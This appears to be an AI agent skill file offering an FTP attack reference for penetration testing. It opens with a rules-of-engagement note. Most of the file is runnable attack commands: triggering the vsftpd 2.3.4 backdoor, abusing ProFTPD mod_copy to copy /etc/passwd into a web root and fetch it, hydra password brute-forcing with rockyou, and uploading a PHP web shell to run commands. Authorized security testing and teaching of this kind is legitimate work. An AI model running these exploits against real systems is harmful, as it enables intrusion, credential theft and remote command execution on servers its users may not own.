---
name: svc-ftp
description: "FTP attacks: anonymous access, writable dirs, version CVEs, credential attacks. Triggers - port 21, vsftpd, ProFTPD, anonymous."
---

## Rules of Engagement
Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.

# FTP Attack Reference

## Enumeration
```bash
nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p 21 <target>
nc -nv <target> 21              # banner grab
```

## Anonymous Access
```bash
ftp <target>
# Login: anonymous / anonymous@
# Or: anonymous / (empty)

# List first (mget * recursively pulls to cwd and can clobber local files)
ftp> ls -la
ftp> cd ..      # try parent directories
```

## Version CVEs
- **vsftpd 2.3.4**: Backdoor — connect to port 6200 after sending `:)` in username
- **ProFTPD 1.3.5** (CVE-2015-3306): mod_copy unauthenticated file copy — `site cpfr /etc/passwd` → `site cpto /var/www/html/passwd.txt`

```bash
# vsftpd 2.3.4 backdoor
echo -e "USER evil:)\nPASS anything" | nc <target> 21
nc <target> 6200

# ProFTPD mod_copy
nc <target> 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/leak.txt
curl http://<target>/leak.txt
```

## Credential Attacks
```bash
# Low thread count: FTP servers often lock accounts or rate-limit after failures
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target> -t 4
hydra -L users.txt -p password ftp://<target>
```

## Writable FTP for Shell Upload
```bash
# If writable directory found + web server running
ftp> put shell.php
curl http://<target>/shell.php?cmd=id
```
